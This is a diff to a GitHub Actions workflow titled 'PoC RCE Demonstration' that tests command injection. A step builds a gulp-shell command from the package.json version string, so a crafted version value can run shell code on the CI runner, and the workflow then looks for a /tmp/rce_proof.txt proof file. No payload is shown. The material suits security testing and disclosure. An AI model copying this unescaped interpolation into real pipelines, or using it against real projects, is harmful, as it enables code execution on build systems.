@@ -2,7 +2,7 @@
 name: PoC RCE Demonstration
 on:
   pull_request:
-    branches: [master]
+    branches: [main]
   workflow_dispatch: true
 jobs:
   build:
@@ -15,23 +15,19 @@ jobs:
           node-version: '12'
       - name: Install dependencies
         run: |
-          npm install gulp@3.9.1 gulp-shell@0.8.0 gulp-zip@3.2.0 \
-            babel-register run-sequence@1.2.3 gulp-concat@2.6.1 \
-            gulp-util@3.0.8 babel-core@6.26.3
+          npm install gulp@3.9.1
+          npm install gulp-shell@0.8.0
       - name: Debug environment
         run: |
           echo "Node version:" && node --version
-          echo "NPM packages:" && npm list gulp gulp-shell gulp-zip \
-            babel-register run-sequence gulp-concat gulp-util babel-core
+          echo "NPM packages:" && npm list gulp gulp-shell
           echo "Package version:" && node -p "require('./package.json').version"
-          echo "Gulpfile snippet:" && cat gulpfile.babel.js | \
-            grep pushCodeFiles -A10
-      - name: Run vulnerable Gulp task
+      - name: Run direct command injection test
         run: |
-          echo "Running gulp pushCodeFiles with version: \
-            $(node -p "require('./package.json').version")"
-          npx gulp pushCodeFiles || echo "Gulp task failed (expected if \
-            gsutil missing); check RCE output"
+          version=$(node -p "require('./package.json').version")
+          echo "Testing command injection with version: $version"
+          script="gulp.task('test', () => require('gulp-shell').task('echo $version')()); gulp.test();"
+          npx gulp -f - <<< "$script" || echo "Gulp task failed; check RCE output"
       - name: Check for proof file
         run: |
           if [ -f /tmp/rce_proof.txt ]; then
